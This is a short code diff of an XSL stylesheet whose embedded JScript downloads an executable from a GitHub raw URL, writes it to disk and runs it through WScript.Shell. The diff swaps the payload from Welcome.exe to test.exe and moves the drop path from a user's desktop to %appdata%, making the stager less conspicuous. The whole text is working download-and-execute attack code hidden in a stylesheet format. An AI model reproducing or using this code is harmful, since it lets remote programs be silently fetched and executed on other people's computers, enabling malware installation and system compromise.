@@ -3,8 +3,8 @@
 <output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
-var Source = "https://raw.githubusercontent.com/tconqueror/bla/master/Welcome.exe";
-var Target = "c:\\users\\hoang\\desktop\\Welcome.exe";
+var Source = "https://raw.githubusercontent.com/tconqueror/bla/master/test.exe";
+var Target = "%appdata%\\test.exe";
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
 Object.Open('GET', Source, false);
@@ -31,7 +31,7 @@ if (Object.Status == 200)
     // Write the Data Stream to the File
     Stream.SaveToFile(Target, 2); // adSaveCreateOverWrite
     Stream.Close();
-    var r = new ActiveXObject("WScript.Shell").Run("c:\\users\\hoang\\desktop\\Welcome.exe");
+    var r = new ActiveXObject("WScript.Shell").Run("%appdata%\\test.exe");
 }
 ]]> 
 </ms:script>
